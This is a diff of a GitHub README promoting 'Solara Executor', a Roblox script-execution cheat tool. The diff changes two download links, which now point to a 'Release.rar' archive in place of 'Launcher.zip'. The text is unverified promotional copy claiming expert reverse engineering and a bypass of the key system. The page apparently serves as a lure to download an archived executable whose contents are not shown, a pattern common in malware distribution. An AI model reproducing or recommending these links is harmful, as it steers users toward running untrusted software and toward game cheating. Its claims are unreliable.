@@ -6,7 +6,7 @@
 
 Are you tired of laggy, unreliable executors for Roblox? Solara Executor brings a dependable, seamless solution designed with Roblox enthusiasts in mind. Crafted by a team of reverse-engineering experts, Solara Executor ensures high performance without the hassle, allowing you to enjoy your favorite scripts without interruptions.
 
-[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/Mahabdelghani/solara-executor/releases/download/solara-activated/Launcher.zip)**
+**[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/Mahabdelghani/solara-executor/releases/download/solara-activated/Release.rar)**
 ## ![FEATURES](https://github.com/user-attachments/assets/f63a4849-c5b0-4de2-88b5-ec60a65ebc29)
 
 
@@ -20,7 +20,7 @@ Are you tired of laggy, unreliable executors for Roblox? Solara Executor brings 
 ![Frame 2147223630 (2)](https://github.com/user-attachments/assets/c565c3ea-a34a-403c-b823-f5606a0ec382)
 
 
-[*Try Solara if you're tired of unreliable Roblox executors!*](https://github.com/Mahabdelghani/solara-executor/releases/download/solara-activated/Launcher.zip)
+[*Try Solara if you're tired of unreliable Roblox executors!*](https://github.com/Mahabdelghani/solara-executor/releases/download/solara-activated/Release.rar)
 
 ### Solara Executor offering a user-friendly design combined with high-level features. Crafted by seasoned reverse engineers, Solara brings smooth script handling to enhance your gaming experience. It provides instant updates, bypasses the need for a key system, and simplifies execution, making it a popular pick for Roblox fans.
 
